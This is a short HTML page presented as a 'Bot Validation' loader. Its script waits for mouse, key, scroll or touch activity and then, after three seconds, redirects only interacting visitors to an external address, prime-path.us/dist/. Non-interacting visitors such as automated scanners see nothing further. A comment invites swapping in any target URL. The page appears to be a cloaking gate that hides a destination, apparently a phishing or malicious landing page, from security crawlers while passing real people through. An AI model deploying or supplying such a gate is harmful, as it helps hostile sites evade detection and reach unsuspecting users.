<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bot Validation</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f3f4f6;
      font-family: Arial, sans-serif;
    }
    .loader {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }
    .bubble {
      width: 15px;
      height: 15px;
      background-color: #3498db;
      border-radius: 50%;
      animation: bounce 1.5s infinite ease-in-out;
    }
    .bubble:nth-child(2) {
      animation-delay: 0.3s;
    }
    .bubble:nth-child(3) {
      animation-delay: 0.6s;
    }
    @keyframes bounce {
      0%, 80%, 100% {
        transform: scale(0);
      }
      40% {
        transform: scale(1);
      }
    }
  </style>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      // Set a flag to detect user interactions
      let isHuman = false;

      // Detect user interactions (mouse, keyboard, scroll, or touch)
      const markHuman = () => {
        isHuman = true;
      };
      document.addEventListener("mousemove", markHuman);
      document.addEventListener("keypress", markHuman);
      document.addEventListener("scroll", markHuman);
      document.addEventListener("touchstart", markHuman);

      // Validate and redirect after delay
      setTimeout(() => {
        if (isHuman) {
          // Redirect if the user is valid
          window.location.href = "https://prime-path.us/dist/"; // Replace with your target URL
        } else {
          console.warn("Bot detected or no interaction from user.");
        }
      }, 3000); // Adjust the delay as needed
    });
  </script>
</head>
<body>
  <div class="loader">
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>
  </div>
</body>
</html>
